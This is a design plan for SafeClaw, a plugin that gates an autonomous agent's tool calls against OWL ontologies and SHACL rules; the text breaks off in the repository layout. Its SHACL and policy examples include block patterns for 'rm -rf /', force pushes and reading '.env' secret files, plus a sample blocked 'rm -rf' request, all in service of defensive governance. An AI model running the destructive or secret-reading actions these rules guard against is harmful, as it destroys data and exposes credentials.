# SafeClaw Development Plan

## A Neurosymbolic Governance Layer for Autonomous AI Agents

**Project**: SafeClaw (aka EnterpriseClaw)
**Base**: OpenClaw autonomous agent framework
**Goal**: Make a fully autonomous agent that is transparent, auditable, and ontologically constrained — never going astray when told not to

---

## 0. KEY ARCHITECTURAL PRINCIPLE: ZERO CORE MODIFICATIONS

**SafeClaw is a pure external plugin. It does NOT modify any OpenClaw source code.**

OpenClaw has a mature plugin discovery system that scans three directories:

1. **Workspace**: `.openclaw/extensions/` in the project directory
2. **Global**: `~/.openclaw/extensions/` in the user's home
3. **Bundled**: Ships with OpenClaw itself

SafeClaw installs into `~/.openclaw/extensions/safeclaw/` (or per-workspace). OpenClaw auto-discovers it via `index.ts` or `package.json` manifest. All integration happens through the **typed public plugin API** (`OpenClawPluginApi`) — the same interface any third-party plugin uses.

### What This Means for Upgrades

- **OpenClaw can be updated independently** — `git pull`, `npm update`, or any upgrade path. SafeClaw is never in the way because it lives outside OpenClaw's codebase.
- **No merge conflicts** — SafeClaw has zero files inside the OpenClaw repo.
- **No fork drift** — Unlike a fork-based approach, SafeClaw doesn't create a diverging codebase that falls behind upstream.
- **Plugin API is the contract** — SafeClaw depends only on OpenClaw's public hook signatures (`before_tool_call`, `before_agent_start`, etc.). These are OpenClaw's plugin contract, designed to be stable across versions.
- **If OpenClaw changes its hook API** — SafeClaw needs only adapter-level updates (adjusting to new event shapes), not deep refactoring. This is a bounded, low-risk maintenance surface.

### Deployment Model

```
~/.openclaw/                     ← OpenClaw config (untouched)
├── config.json                  ← Add safeclaw to plugins.load[]
├── extensions/
│   └── safeclaw/                ← SafeClaw lives here (separate repo)
│       ├── package.json         ← Plugin manifest
│       ├── index.ts             ← Plugin entry point
│       └── src/                 ← All SafeClaw code
│
~/.safeclaw/                     ← SafeClaw's own data (separate)
├── config.json                  ← SafeClaw configuration
├── ontologies/                  ← OWL files
│   ├── safeclaw-agent.ttl
│   ├── safeclaw-policy.ttl
│   └── users/
└── audit/                       ← Audit logs
    └── 2026-02-16/
```

Two completely separate directory trees. OpenClaw owns `~/.openclaw/`. SafeClaw owns `~/.safeclaw/`. The only touchpoint is one line in OpenClaw's config pointing to the plugin.

---

## 1. VISION

OpenClaw is a powerful autonomous agent that can execute shell commands, edit files, browse the web, send messages, and manage long-running workflows. SafeClaw wraps it with a **neurosymbolic governance layer** that:

- **Gates every action** through formal ontological constraints before execution
- **Grounds every LLM call** with factual context from a knowledge graph
- **Audits every decision** with machine-readable justifications tied to ontology concepts
- **Stores user preferences** as OWL triples that act as hard constraints, not suggestions
- **Runs a reasoner in the loop** that can detect inconsistencies and policy violations before they happen

The agent remains fully autonomous in its capabilities, but operates within a **formally defined behavioral envelope**. Think of it as the difference between a self-driving car with no guardrails and one with lane-keeping, speed limits, and collision avoidance — same engine, radically different safety profile.

---

## 2. ARCHITECTURE OVERVIEW

```
┌─────────────────────────────────────────────────────────────┐
│                    USER / CHANNELS                          │
│              (CLI, WhatsApp, Telegram, Web)                 │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│                 OPENCLAW GATEWAY                            │
│            (WebSocket control plane)                        │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│              SAFECLAW PLUGIN LAYER                          │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Hook: before_agent_start                           │    │
│  │  → Query knowledge graph for session context        │    │
│  │  → Inject user constraints into system prompt       │    │
│  │  → Load domain-specific ontology rules              │    │
│  ├─────────────────────────────────────────────────────┤    │
│  │  Hook: llm_input / llm_output                       │    │
│  │  → Full audit logging of LLM I/O                    │    │
│  │  → Parse proposed actions from LLM output           │    │
│  │  → Detect constraint violations early               │    │
│  ├─────────────────────────────────────────────────────┤    │
│  │  Hook: before_tool_call  ← THE PRIMARY GATE         │    │
│  │  → Run reasoner against proposed action             │    │
│  │  → Check user preference constraints                │    │
│  │  → Check domain policy constraints                  │    │
│  │  → BLOCK with reason if violation detected          │    │
│  │  → Log decision + ontological justification         │    │
│  ├─────────────────────────────────────────────────────┤    │
│  │  Hook: after_tool_call                              │    │
│  │  → Update knowledge graph with action results       │    │
│  │  → Record outcome for audit trail                   │    │
│  ├─────────────────────────────────────────────────────┤    │
│  │  Hook: message_sending                              │    │
│  │  → Validate outgoing messages against policies      │    │
│  │  → BLOCK messages that violate communication rules  │    │
│  └─────────────────────────────────────────────────────┘    │
│                          │                                   │
│  ┌───────────────────────▼─────────────────────────────┐    │
│  │         NEUROSYMBOLIC ENGINE                        │    │
│  │                                                     │    │
│  │  ┌─────────────┐  ┌──────────────┐  ┌───────────┐  │    │
│  │  │ Knowledge   │  │ OWL 2 RL     │  │ Audit     │  │    │
│  │  │ Graph       │  │ Reasoner     │  │ Logger    │  │    │
│  │  │ (N3 Store)  │  │ (eye-js)     │  │ (append-  │  │    │
│  │  │             │  │              │  │  only log) │  │    │
│  │  └──────┬──────┘  └──────┬───────┘  └─────┬─────┘  │    │
│  │         │                │                 │        │    │
│  │  ┌──────▼────────────────▼─────────────────▼─────┐  │    │
│  │  │           SPARQL Query Layer                   │  │    │
│  │  │           (Comunica / Oxigraph)                │  │    │
│  │  └────────────────────────────────────────────────┘  │    │
│  │         │                                            │    │
│  │  ┌──────▼────────────────────────────────────────┐   │    │
│  │  │           OWL Ontology Files                   │   │    │
│  │  │  ┌──────────┐ ┌──────────┐ ┌──────────────┐   │   │    │
│  │  │  │ Agent    │ │ Domain   │ │ User          │   │   │    │
│  │  │  │ Behavior │ │ Policies │ │ Preferences   │   │   │    │
│  │  │  │ Ontology │ │ Ontology │ │ (per-user)    │   │   │    │
│  │  │  └──────────┘ └──────────┘ └──────────────┘   │   │    │
│  │  └────────────────────────────────────────────────┘   │    │
│  └───────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│              OPENCLAW AGENT CORE                            │
│         (LLM calls, tool execution, sessions)               │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. TECHNOLOGY CHOICES

### Design Principle: Python-First

The best OWL/RDF/SPARQL tools live in the Java and Python ecosystems. Since the user
prefers Python, SafeClaw's core logic is written **entirely in Python**. The
OpenClaw plugin is a minimal TypeScript HTTP client (~50 lines) that forwards
hook events to the Python service. This means:

- **~95% of SafeClaw code is Python**
- The TypeScript plugin is a thin bridge, not business logic
- All ontology work, reasoning, constraint checking, audit — Python
- Easy to test, extend, and debug in a single language

### 3.1 Service Framework: FastAPI

**Why**: Modern async Python web framework. Perfect for a constraint-checking service that needs low latency.

- **Package**: `fastapi` + `uvicorn`
- **Features**: Async endpoints, automatic OpenAPI docs, Pydantic validation, WebSocket support
- **Latency**: uvicorn serves requests in <1ms overhead

### 3.2 Ontology Management: owlready2

**Why**: The most complete OWL 2 library in Python. Loads OWL files as native Python objects, supports class hierarchies, property restrictions, individuals, SWRL rules.

- **Package**: `owlready2` (v0.50, February 2026, PyPI status: Production/Stable)
- **OWL support**: Full OWL 2, loads OWL/XML, RDF/XML, N-Triples
- **Reasoning**: Bundles HermiT (OWL-DL tableau reasoner) via JVM subprocess
- **Storage**: Built-in SQLite3 quadstore, tested up to 1 billion triples
- **SPARQL**: Native SPARQL engine (~60x faster than RDFLib for some queries)

**Critical: JVM cold start mitigation.** owlready2 spawns a new JVM for each `sync_reasoner()` call (~500-2000ms). SafeClaw solves this with **pre-computation**:
1. Run HermiT **once at startup** and when ontology files change
2. Cache the inferred model in the SQLite quadstore
3. All real-time constraint checks query the **pre-computed model** — no JVM call
4. Ontology file watcher triggers re-reasoning only when policies/preferences change

This means the JVM cost is amortized: seconds at startup, zero at runtime.

### 3.3 Real-Time Constraint Validation: pySHACL

**Why**: SHACL (Shapes Constraint Language) is a W3C standard designed specifically for **closed-world data validation** — exactly what governance constraint checking is. pySHACL is the reference Python implementation.

- **Package**: `pyshacl` (actively maintained, part of RDFLib ecosystem)
- **What it does**: Validates RDF data against SHACL shape graphs
- **Performance**: <50ms for small shape graphs — well within our <200ms target
- **Closed-world**: Unlike OWL (open-world assumption), SHACL validates what IS there, not what COULD be. Perfect for "does this action violate any rules?"

**Why SHACL + OWL together?**

| Concern | Tool | Reasoning Model |
|---|---|---|
| "What can be inferred from this data?" | OWL (owlready2 + HermiT) | Open-world, pre-computed at startup |
| "Does this data violate any constraints?" | SHACL (pySHACL) | Closed-world, checked in real-time |

OWL tells you what's true. SHACL tells you what's wrong. Together they form a complete governance layer:
- OWL pre-computes the class hierarchy, property inferences, equivalences
- SHACL validates each proposed action against constraint shapes in real-time

**Example SHACL shape for SafeClaw**:
```turtle
@prefix sh: <http://www.w3.org/ns/shacl#> .
@prefix sc: <http://safeclaw.ai/ontology/agent#> .

# Any action that is CriticalRisk and not reversible MUST require confirmation
sc:CriticalIrreversibleShape a sh:NodeShape ;
    sh:targetClass sc:Action ;
    sh:rule [
        a sh:TripleRule ;
        sh:condition [
            sh:property [ sh:path sc:hasRiskLevel ; sh:hasValue sc:CriticalRisk ] ;
            sh:property [ sh:path sc:isReversible ; sh:hasValue false ] ;
        ] ;
    ] ;
    sh:property [
        sh:path sc:requiresConfirmation ;
        sh:hasValue true ;
        sh:message "Critical irreversible actions require user confirmation" ;
    ] .

# Shell commands must not match any forbidden pattern
sc:ForbiddenCommandShape a sh:NodeShape ;
    sh:targetClass sc:ShellAction ;
    sh:property [
        sh:path sc:commandText ;
        sh:not [ sh:pattern "git push.*--force" ] ;
        sh:message "Force push is prohibited" ;
    ] ;
    sh:property [
        sh:path sc:commandText ;
        sh:not [ sh:pattern "rm\\s+-rf\\s+/" ] ;
        sh:message "Recursive deletion of root paths is prohibited" ;
    ] .
```

### 3.4 RDF Parsing & SPARQL: RDFLib

**Why**: The standard Python RDF library. Mature, well-maintained, part of the same ecosystem as pySHACL and OWL-RL.

- **Package**: `rdflib` (actively maintained)
- **Formats**: Turtle, N-Triples, N-Quads, JSON-LD, RDF/XML, TriG
- **SPARQL**: Full SPARQL 1.1 query engine built-in
- **Integration**: pySHACL and owlready2 both interop with RDFLib graphs

### 3.5 Scale-up Path: Apache Jena Fuseki (Docker)

When the in-process approach hits limits (large ontologies, persistent storage, federated queries):

- **Jena Fuseki**: Production-grade SPARQL 1.1 endpoint, TDB2 persistent storage, web admin UI
- **Jena reasoners**: OWL Micro/Mini/Full rule-based reasoning with precomputation — <10ms per query after warmup
- **Openllet** (optional): Full OWL 2 DL via Jena adapter, for when you need tableau reasoning as a service
- **Access from Python**: Standard HTTP/SPARQL protocol via `SPARQLWrapper` or plain `requests`
- **Note**: The uku-ai org already has a Jena fork that could be leveraged

Jena Fuseki is the scale-up path, not the starting point. Start with pure Python.

### 3.6 Audit Storage: SQLite → PostgreSQL

- **Phase 1-3**: SQLite via Python `sqlite3` (zero dependencies, JSONL audit + structured queries)
- **Phase 4+**: PostgreSQL via `asyncpg` or SQLAlchemy (when you need multi-agent centralized audit)
- Audit records are always JSON — same format regardless of backend

### 3.7 Decision Summary

| Component | Library | Language | Justification |
|---|---|---|---|
| **Service API** | FastAPI + uvicorn | Python | Low latency, async, auto-docs |
| **Ontology Management** | owlready2 | Python | Full OWL 2, Python-native objects |
| **OWL Reasoning** | owlready2 + HermiT | Python + Java (startup only) | Full OWL-DL, pre-computed |
| **Constraint Validation** | pySHACL | Python | Real-time closed-world validation, <50ms |
| **RDF & SPARQL** | RDFLib | Python | Standard, full SPARQL 1.1 |
| **Triple Storage** | owlready2 SQLite quadstore | Python | Built-in, up to 1B triples |
| **Persistence** | Turtle files on disk | — | Human-readable, git-trackable |
| **Audit Storage** | SQLite → PostgreSQL | Python | Zero deps → enterprise scale |
| **Scale-up Reasoner** | Jena Fuseki (Docker) | Java (HTTP access) | Production SPARQL, warm JVM |
| **OpenClaw Plugin** | Thin HTTP client | TypeScript | ~50 lines, just a bridge |

### 3.8 What's Python vs What's Not

```
Python (~95% of SafeClaw code):
  ├── FastAPI service (all business logic)
  ├── owlready2 (ontology management)
  ├── pySHACL (constraint validation)
  ├── RDFLib (RDF/SPARQL)
  ├── Audit system
  ├── Policy manager
  ├── Context builder
  ├── Action classifier
  └── CLI tools

TypeScript (~50 lines, just a bridge):
  └── OpenClaw plugin that forwards hook events via HTTP

Java (only at startup, managed by owlready2):
  └── HermiT reasoner (pre-computes OWL inferences)

Java (optional Docker sidecar for scale-up):
  └── Jena Fuseki (SPARQL endpoint + persistent reasoning)
```

---

## 3.6 Deployment Modes: Embedded, Remote, or Hybrid

SafeClaw supports three deployment modes. The engine logic is identical — only the transport layer changes.

### Mode A: Local (default for single-developer)

SafeClaw Python service runs on localhost alongside OpenClaw. The TypeScript plugin calls `http://localhost:8420`. Both on the same machine, but separate processes.

```
┌────────────────────────────────┐     ┌─────────────────────────────┐
│ OpenClaw Node.js process       │     │ SafeClaw Python process     │
│  ├── OpenClaw core             │     │  ├── FastAPI (port 8420)    │
│  └── SafeClaw plugin (HTTP) ───┼────→│  ├── owlready2 + HermiT    │
│       (~50 lines TypeScript)   │     │  ├── pySHACL (real-time)    │
└────────────────────────────────┘     │  ├── RDFLib (SPARQL)        │
                                       │  └── Audit (SQLite)         │
                                       └─────────────────────────────┘
```

**Best for**: single-developer use, local development. Start with `safeclaw serve` and go.

**Why not truly embedded?** OWL tools are Python/Java, not TypeScript. A Python subprocess gives access to the full owlready2/pySHACL/RDFLib ecosystem with zero compromises. The localhost HTTP call adds <5ms latency — negligible compared to LLM calls that take seconds.

### Mode B: Remote Service

Same Python service, deployed to cloud. Multiple OpenClaw agents connect to one SafeClaw instance.

```
┌──────────────────────┐          ┌─────────────────────────────────┐
│ OpenClaw instance 1  │          │ SafeClaw Python Service          │
│  └── SafeClaw client ├──HTTPS──→│  ├── FastAPI                     │
├──────────────────────┤          │  ├── owlready2 + HermiT          │
│ OpenClaw instance 2  │          │  ├── pySHACL (real-time)          │
│  └── SafeClaw client ├──HTTPS──→│  ├── RDFLib (SPARQL)             │
├──────────────────────┤          │  ├── PostgreSQL (audit)           │
│ OpenClaw instance N  │          │  ├── Jena Fuseki (opt, scale-up) │
│  └── SafeClaw client ├──HTTPS──→│  └── Dashboard UI                │
└──────────────────────┘          └─────────────────────────────────┘
                                          (one service, many agents)
```

**Best for**: enterprise, multi-agent, centralized policy management, SaaS.

**Key advantages**:
- **One service governs many agents** — policy change applies everywhere instantly
- **Full Python OWL stack** — owlready2, pySHACL, RDFLib, no compromises
- **Centralized audit** — all agents' decisions in PostgreSQL, one dashboard
- **Independent scaling** — reasoner scales separately from agents
- **SaaS-ready** — customers connect their agents to your SafeClaw service

**Remote Service API**:

```
POST /api/v1/evaluate/tool-call
{
  "sessionId": "abc-123",
  "userId": "henrik",
  "toolName": "exec",
  "params": { "command": "rm -rf /tmp/old" },
  "sessionHistory": ["read", "edit", "write"]
}
→ { "decision": "blocked", "reason": "...", "auditId": "dec-789" }

POST /api/v1/context/build
{ "sessionId": "abc-123", "userId": "henrik" }
→ { "prependContext": "## SafeClaw Governance Context\n..." }

POST /api/v1/evaluate/message
{ "sessionId": "abc-123", "to": "user@email.com", "content": "..." }
→ { "decision": "allowed" }

GET  /api/v1/audit?sessionId=abc-123
→ { "decisions": [...] }

PUT  /api/v1/policies
{ "add": [{ "type": "Prohibition", "pattern": "...", "reason": "..." }] }
→ { "ok": true }

GET  /api/v1/preferences/{userId}
→ { "autonomyLevel": "moderate", "confirmBeforeDelete": true, ... }
```

### Mode C: Hybrid (recommended for production at scale)

A lightweight local Python process caches policies for fast checks. Complex reasoning and audit go to the central service.

```
┌──────────────────────┐   ┌──────────────────────────────┐
│ OpenClaw             │   │ SafeClaw Local (Python)       │
│  └── SC plugin (TS)──┼──→│  ├── Cached SHACL shapes     │
└──────────────────────┘   │  ├── Cached user preferences  │
                           │  ├── Pattern-match checks     │
                           │  │                            │
                           │  Simple check? → decide <5ms  │
                           │  Complex? ─────────────────┐  │
                           └────────────────────────────┼──┘
                                                        │ HTTPS
                           ┌────────────────────────────▼──┐
                           │ SafeClaw Central (Python)      │
                           │  ├── owlready2 + HermiT        │
                           │  ├── pySHACL (full validation)  │
                           │  ├── PostgreSQL (audit)         │
                           │  ├── Jena Fuseki (optional)     │
                           │  └── Dashboard UI               │
                           └────────────────────────────────┘
```

**Routing logic**:
- **Local** (< 5ms): forbidden path patterns, forbidden command patterns, simple preference checks, action classification. Uses cached SHACL shapes.
- **Remote** (< 200ms): full SHACL validation, OWL reasoner queries, dependency chain checking, multi-step plan analysis
- **Async** (non-blocking): audit logging, knowledge graph updates, violation tracking

**Resilience**:
- If the remote service is down, the local cache continues enforcing cached policies and SHACL shapes
- Circuit breaker: after 3 failed calls, switch to local-only mode automatically
- Policy sync: local process polls service every 60s for policy/shape updates, or service pushes via WebSocket
- Graceful degradation: local mode covers ~80% of checks; only complex OWL reasoning is lost

### Architecture: Python Service + TypeScript Bridge

Since all logic lives in the Python service, the architecture is the same for all modes — only the network topology changes (localhost vs remote URL).

**Python service (the brain — all modes):**

```python
# safeclaw/service/engine.py
from abc import ABC, abstractmethod

class SafeClawEngine(ABC):
    """Core engine interface. All constraint logic goes here."""

    @abstractmethod
    async def evaluate_tool_call(self, event: ToolCallEvent) -> Decision: ...

    @abstractmethod
    async def evaluate_message(self, event: MessageEvent) -> Decision: ...

    @abstractmethod
    async def build_context(self, event: AgentStartEvent) -> ContextResult: ...

    @abstractmethod
    async def record_action_result(self, event: ToolResultEvent) -> None: ...

    @abstractmethod
    async def log_llm_io(self, event: LlmIOEvent) -> None: ...


class FullEngine(SafeClawEngine):
    """Complete engine with owlready2 + pySHACL + RDFLib."""

    def __init__(self, config: SafeClawConfig):
        self.ontology = owlready2.get_ontology(config.ontology_path).load()
        self.shacl_shapes = load_shacl_shapes(config.shapes_dir)
        self.audit = AuditLogger(config.audit_dir)
        self.classifier = ActionClassifier(self.ontology)
        # Pre-compute OWL inferences at startup
        with self.ontology:
            sync_reasoner_hermit()  # JVM call — once at startup

    async def evaluate_tool_call(self, event):
        # 1. Classify action
        action = self.classifier.classify(event.tool_name, event.params)
        # 2. Validate against SHACL shapes (real-time, <50ms)
        result = validate(action.as_graph(), self.shacl_shapes)
        # 3. Check user preferences
        prefs = self.get_user_preferences(event.user_id)
        # 4. Log decision
        self.audit.log(decision)
        return decision


class CachedEngine(SafeClawEngine):
    """Lightweight engine for hybrid local cache mode."""

    def __init__(self, cached_shapes, cached_preferences):
        self.shapes = cached_shapes
        self.preferences = cached_preferences

    async def evaluate_tool_call(self, event):
        # Fast pattern matching only — no full reasoner
        # Falls through to remote for complex checks
        ...
```

**TypeScript plugin (the bridge — ~50 lines):**

```typescript
// openclaw-extensions/safeclaw/index.ts
// This is the ONLY TypeScript in SafeClaw

const SAFECLAW_URL = process.env.SAFECLAW_URL ?? 'http://localhost:8420';

export default {
  id: 'safeclaw',
  name: 'SafeClaw Governance',
  register(api) {
    const post = async (path, body) => {
      const res = await fetch(`${SAFECLAW_URL}${path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });
      return res.json();
    };

    api.on('before_tool_call', async (event, ctx) => {
      const result = await post('/evaluate/tool-call', { ...event, ...ctx });
      if (result.block) return { block: true, blockReason: result.reason };
    }, { priority: 100 });

    api.on('before_agent_start', async (event, ctx) => {
      const result = await post('/context/build', { ...event, ...ctx });
      return { prependContext: result.prependContext };
    }, { priority: 100 });

    api.on('after_tool_call', (event, ctx) => {
      post('/record/tool-result', { ...event, ...ctx }).catch(() => {});
    });

    api.on('llm_input', (event, ctx) => {
      post('/log/llm-input', { ...event, ...ctx }).catch(() => {});
    });

    api.on('llm_output', (event, ctx) => {
      post('/log/llm-output', { ...event, ...ctx }).catch(() => {});
    });

    api.on('message_sending', async (event, ctx) => {
      const result = await post('/evaluate/message', { ...event, ...ctx });
      if (result.cancel) return { cancel: true, content: result.reason };
    }, { priority: 100 });
  },
};
```

That's it. ~50 lines of TypeScript. Everything else is Python.

### Cloud Deployment Architectures

**Single agent in cloud (embedded)**:
```
Docker container
  └── OpenClaw + SafeClaw (one process)
  └── Volume: /safeclaw/ontologies, /safeclaw/audit
```

**Multi-agent enterprise (remote/hybrid)**:
```
┌─────────────────────────────────────────────┐
│            Kubernetes / ECS                  │
│                                              │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐    │
│  │ Agent 1  │ │ Agent 2  │ │ Agent N  │    │
│  │ OpenClaw │ │ OpenClaw │ │ OpenClaw │    │
│  │+SC client│ │+SC client│ │+SC client│    │
│  └────┬─────┘ └────┬─────┘ └────┬─────┘    │
│       │             │             │          │
│  ┌────▼─────────────▼─────────────▼────┐    │
│  │     SafeClaw Central Service        │    │
│  │  ┌────────────┐ ┌────────────────┐  │    │
│  │  │ Jena Fuseki│ │ Policy Manager │  │    │
│  │  │ (reasoner) │ │ (REST API)     │  │    │
│  │  └────────────┘ └────────────────┘  │    │
│  │  ┌────────────┐ ┌────────────────┐  │    │
│  │  │ PostgreSQL │ │ Dashboard UI   │  │    │
│  │  │ (audit DB) │ │ (FastHTML)     │  │    │
│  │  └────────────┘ └────────────────┘  │    │
│  └─────────────────────────────────────┘    │
│                                              │
│  ┌──────────────────────────────────────┐   │
│  │ Shared persistent storage            │   │
│  │ (EFS / Filestore / S3)               │   │
│  │  └── ontologies/, user-prefs/        │   │
│  └──────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

**SafeClaw as a Service (SaaS)**:
```
Customer's infrastructure          SafeClaw Cloud (your infra)
┌──────────────┐                   ┌──────────────────────┐
│ Their agents │───── HTTPS ──────→│ SafeClaw Service     │
│ + SC client  │                   │ (multi-tenant)       │
└──────────────┘                   │  ├── Tenant isolation │
                                   │  ├── Policy per org  │
                                   │  ├── Audit per org   │
                                   │  └── Usage billing   │
                                   └──────────────────────┘
```

---

## 4. ONTOLOGY DESIGN

Three ontology layers, each serving a distinct purpose:

### 4.1 Agent Behavior Ontology (`safeclaw-agent.owl`)

Defines what an agent CAN and CANNOT do. This is the formal specification of the agent's behavioral envelope.

```turtle
@prefix sc: <http://safeclaw.ai/ontology/agent#> .
@prefix owl: <http://www.w3.org/2002/07/owl#> .
@prefix rdfs: <http://www.w3.org/2000/01/rdf-schema#> .
@prefix xsd: <http://www.w3.org/2001/XMLSchema#> .

# --- Action Taxonomy ---
sc:Action a owl:Class .
sc:FileAction rdfs:subClassOf sc:Action .
sc:ShellAction rdfs:subClassOf sc:Action .
sc:NetworkAction rdfs:subClassOf sc:Action .
sc:MessageAction rdfs:subClassOf sc:Action .
sc:BrowserAction rdfs:subClassOf sc:Action .

sc:ReadFile rdfs:subClassOf sc:FileAction .
sc:WriteFile rdfs:subClassOf sc:FileAction .
sc:DeleteFile rdfs:subClassOf sc:FileAction .
sc:ExecuteCommand rdfs:subClassOf sc:ShellAction .
sc:WebFetch rdfs:subClassOf sc:NetworkAction .
sc:SendMessage rdfs:subClassOf sc:MessageAction .

# --- Risk Classification ---
sc:RiskLevel a owl:Class .
sc:LowRisk a sc:RiskLevel .
sc:MediumRisk a sc:RiskLevel .
sc:HighRisk a sc:RiskLevel .
sc:CriticalRisk a sc:RiskLevel .

sc:hasRiskLevel a owl:ObjectProperty ;
    rdfs:domain sc:Action ;
    rdfs:range sc:RiskLevel .

sc:DeleteFile sc:hasRiskLevel sc:CriticalRisk .
sc:ExecuteCommand sc:hasRiskLevel sc:HighRisk .
sc:WriteFile sc:hasRiskLevel sc:MediumRisk .
sc:ReadFile sc:hasRiskLevel sc:LowRisk .

# --- Reversibility ---
sc:isReversible a owl:DatatypeProperty ;
    rdfs:domain sc:Action ;
    rdfs:range xsd:boolean .

sc:ReadFile sc:isReversible true .
sc:WriteFile sc:isReversible true .   # can be undone via version control
sc:DeleteFile sc:isReversible false .
sc:SendMessage sc:isReversible false .

# --- Requires Confirmation ---
sc:requiresConfirmation a owl:DatatypeProperty ;
    rdfs:domain sc:Action ;
    rdfs:range xsd:boolean .

# --- Scope / Blast Radius ---
sc:AffectsScope a owl:Class .
sc:LocalOnly a sc:AffectsScope .      # only local filesystem
sc:SharedState a sc:AffectsScope .     # git push, shared DB
sc:ExternalWorld a sc:AffectsScope .   # emails, messages, APIs

sc:affectsScope a owl:ObjectProperty ;
    rdfs:domain sc:Action ;
    rdfs:range sc:AffectsScope .
```

**Key concepts**:
- Every tool call maps to an `sc:Action` subclass
- Actions have risk levels, reversibility flags, scope classifications
- The reasoner uses these to decide: auto-approve, require confirmation, or block

### 4.2 Domain Policy Ontology (`safeclaw-policy.owl`)

Defines organizational/project-specific rules. These are the "never do X" and "always do Y before Z" rules.

```turtle
@prefix sp: <http://safeclaw.ai/ontology/policy#> .

# --- Policy Rules ---
sp:Policy a owl:Class .
sp:Constraint a owl:Class .
sp:Prohibition rdfs:subClassOf sp:Constraint .   # MUST NOT
sp:Obligation rdfs:subClassOf sp:Constraint .     # MUST
sp:Permission rdfs:subClassOf sp:Constraint .     # MAY

# --- Path Constraints ---
sp:PathConstraint rdfs:subClassOf sp:Constraint .
sp:forbiddenPathPattern a owl:DatatypeProperty ;
    rdfs:domain sp:PathConstraint ;
    rdfs:range xsd:string .

# Example: never touch .env files
sp:NoEnvFiles a sp:Prohibition, sp:PathConstraint ;
    sp:forbiddenPathPattern ".*\\.env.*" ;
    sp:reason "Environment files may contain secrets" .

# --- Command Constraints ---
sp:CommandConstraint rdfs:subClassOf sp:Constraint .
sp:forbiddenCommandPattern a owl:DatatypeProperty ;
    rdfs:domain sp:CommandConstraint ;
    rdfs:range xsd:string .

# Example: no force push
sp:NoForcePush a sp:Prohibition, sp:CommandConstraint ;
    sp:forbiddenCommandPattern "git push.*--force" ;
    sp:reason "Force push can destroy shared history" .

# --- Temporal Constraints ---
sp:TemporalConstraint rdfs:subClassOf sp:Constraint .
sp:notBefore a owl:DatatypeProperty ; rdfs:range xsd:time .
sp:notAfter a owl:DatatypeProperty ; rdfs:range xsd:time .

# Example: no deployments outside business hours
sp:BusinessHoursOnly a sp:Obligation, sp:TemporalConstraint ;
    sp:appliesTo sp:DeployAction ;
    sp:notBefore "09:00:00"^^xsd:time ;
    sp:notAfter "17:00:00"^^xsd:time ;
    sp:reason "Deployments require team availability for rollback" .

# --- Dependency Constraints ---
sp:DependencyConstraint rdfs:subClassOf sp:Constraint .
sp:requiresBefore a owl:ObjectProperty ;
    rdfs:domain sp:DependencyConstraint ;
    rdfs:range sc:Action .

# Example: must run tests before any git push
sp:TestBeforePush a sp:Obligation, sp:DependencyConstraint ;
    sp:appliesTo sp:GitPushAction ;
    sp:requiresBefore sp:RunTestsAction ;
    sp:reason "All pushes must pass tests first" .
```

**Key concepts**:
- Prohibitions, Obligations, and Permissions (deontic logic, lightweight)
- Pattern-based constraints on paths, commands, URLs
- Temporal constraints (when actions are allowed)
- Dependency constraints (action A requires action B first)
- Every constraint has a `sp:reason` — this feeds the audit trail

### 4.3 User Preference Ontology (`safeclaw-user-{id}.owl`)

Per-user preferences stored as OWL triples. These act as hard constraints on agent behavior for that user.

```turtle
@prefix su: <http://safeclaw.ai/ontology/user#> .

# --- User ---
su:User a owl:Class .
su:hasPreference a owl:ObjectProperty ;
    rdfs:domain su:User ;
    rdfs:range su:Preference .

# --- Preference Categories ---
su:Preference a owl:Class .
su:CodingPreference rdfs:subClassOf su:Preference .
su:CommunicationPreference rdfs:subClassOf su:Preference .
su:SafetyPreference rdfs:subClassOf su:Preference .
su:SchedulingPreference rdfs:subClassOf su:Preference .

# --- Coding Preferences ---
su:preferredLanguage a owl:DatatypeProperty ; rdfs:range xsd:string .
su:preferredTestFramework a owl:DatatypeProperty ; rdfs:range xsd:string .
su:alwaysRunTestsBefore a owl:DatatypeProperty ; rdfs:range xsd:string .
su:neverModifyPaths a owl:DatatypeProperty ; rdfs:range xsd:string .
su:maxFilesPerCommit a owl:DatatypeProperty ; rdfs:range xsd:integer .

# --- Communication Preferences ---
su:toneOfVoice a owl:DatatypeProperty ; rdfs:range xsd:string .
su:maxMessageLength a owl:DatatypeProperty ; rdfs:range xsd:integer .
su:neverContactList a owl:DatatypeProperty ; rdfs:range xsd:string .

# --- Safety Preferences ---
su:confirmBeforeDelete a owl:DatatypeProperty ; rdfs:range xsd:boolean .
su:confirmBeforePush a owl:DatatypeProperty ; rdfs:range xsd:boolean .
su:confirmBeforeSend a owl:DatatypeProperty ; rdfs:range xsd:boolean .
su:autonomyLevel a owl:DatatypeProperty ; rdfs:range xsd:string .
  # Values: "full" | "high" | "moderate" | "cautious" | "supervised"
```

**Key concepts**:
- Preferences are hard constraints, not hints
- The agent MUST check preferences before acting
- Preferences are human-readable Turtle files — users can edit them directly or via UI
- Per-user isolation: each user gets their own ontology file

---

## 5. NEUROSYMBOLIC ENGINE DESIGN

### 5.1 Core Components

Two repositories:

**1. safeclaw-service/ (Python — the brain)**
```
safeclaw-service/
├── safeclaw/
│   ├── __init__.py
│   ├── main.py                      # FastAPI app, uvicorn entrypoint
│   ├── config.py                    # Pydantic settings
│   ├── engine/
│   │   ├── __init__.py
│   │   ├── core.py                  # SafeClawEngine base class
│   │   ├── full_engine.py           # Full engine (owlready2 + pySHACL)
│   │   ├── cached_engine.py         # Lightweight cached engine (hybrid local)
│   │   ├── knowledge_graph.py       # RDFLib graph manager, load/save ontologies
│   │   ├── reasoner.py              # owlready2 + HermiT wrapper, pre-computation
│   │   ├── shacl_validator.py       # pySHACL wrapper, real-time validation
│   │   └── context_builder.py       # Build LLM context from knowledge graph
│   ├── constraints/
│   │   ├── __init__.py
│   │   ├── action_classifier.py     # Map tool calls → ontology action classes
│   │   ├── policy_checker.py        # Evaluate policies against proposed actions
│   │   ├── preference_checker.py    # Check user preferences (OWL triples)
